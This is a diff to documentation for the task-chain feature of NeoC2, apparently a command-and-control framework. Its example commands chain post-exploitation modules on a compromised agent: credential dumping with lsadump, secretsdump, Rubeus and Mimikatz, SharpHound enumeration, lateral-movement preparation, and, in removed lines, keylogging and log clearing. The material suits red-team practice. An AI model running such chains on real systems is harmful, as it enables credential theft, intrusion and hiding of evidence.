@@ -157,38 +157,30 @@ When a task chain is executed, it follows this execution flow:
    - Chain status reflects the overall progress
    - Error details are preserved for troubleshooting
 
-## Module Compatibility
+### Module Compatibility
 
-Task chains work with any NeoC2 module that follows the standard module interface. Common use cases:
+Task chains work with any NeoC2 module that follows the standard module interface.
 
-### Reconnaissance Chains
+### Example Workflows
+
+Execute multiple module extensions in sequence:
+
 ```bash
-# Basic enumeration
-taskchain create AGENT001 sysinfo,whoami,env_enum name=host_recon
+# Enumeration chain
+taskchain create AGENT001 execute-bof=netview.x64.o,netsession.x64.o,execute-assembly=SharpHound.exe name=enum_chain
 
-# Network enumeration
-taskchain create AGENT001 net_scan,port_scan,service_enum name=network_recon
-```
+# Credential harvesting chain
+taskchain create AGENT001 execute-bof=lsadump.o,secretsdump.o,execute-assembly=Rubeus.exe,pwsh=Invoke-Mimikatz.ps1 name=credential_harvest
 
-### Post-Exploitation Chains
-```bash
-# Privilege escalation attempt
-taskchain create AGENT001 get_system,whoami,pslist name=priv_escalation
-
-# Data collection
-taskchain create AGENT001 keylog,screen_capture,file_search name=data_harvest
-```
-
-### Cleanup Chains
-```bash
-# Activity cleanup
-taskchain create AGENT001 clear_logs,kill_processes,cleanup_files name=cleanup
+# Lateral movement preparation
+taskchain create AGENT001 execute-bof=netview.o,shares.o,execute-assembly=SharpHound.exe name=lateral_movement_prep
 ```
 
 ### Monitoring
 - Monitor chain status regularly during execution
 - Check individual task results if the chain fails
 - Use the `taskchain status` command to track progress
+
 
 ## Troubleshooting
 
@@ -214,31 +206,4 @@ taskchain create AGENT001 clear_logs,kill_processes,cleanup_files name=cleanup
 - Limit the number of resource-intensive modules in a single chain
 - Monitor agent performance during chain execution
 
-## Example Workflows
-
-### 1. Beacon Object File Execution (BOFs)
-```bash
-# Execute multiple BOF files in sequence
-taskchain create AGENT001 execute-bof=whoami.x64.o,tasklist.x64.o,seatbelt.x64.o name=bof_chain
-
-# Multi-step enumeration with BOFs
-taskchain create AGENT001 execute-bof=netview.x64.o,netsession.x64.o,execute-assembly=SharpHound.exe name=enum_chain
-```
-
-### 2. Persistent Monitoring
-```bash
-# Regular monitoring chain
-taskchain create AGENT001 sysinfo,service_check,process_monitor name=persistent_monitoring
-
-# Enhanced monitoring with multiple checks
-taskchain create AGENT001 execute-bof=service_enum.o,process_check.o,execute-assembly=SharpHound.exe name=enhanced_monitoring
-```
-
-### 3. Post-Exploitation
-```bash
-# Credential harvesting chain
-taskchain create AGENT001 execute-bof=lsadump.o,secretsdump.o,execute-assembly=Rubeus.exe,pwsh=Invoke-Mimikatz.ps1 name=credential_harvest
-
-# Lateral movement preparation
-taskchain create AGENT001 execute-bof=netview.o,shares.o,execute-assembly=SharpHound.exe name=lateral_movement_prep
-```
+  
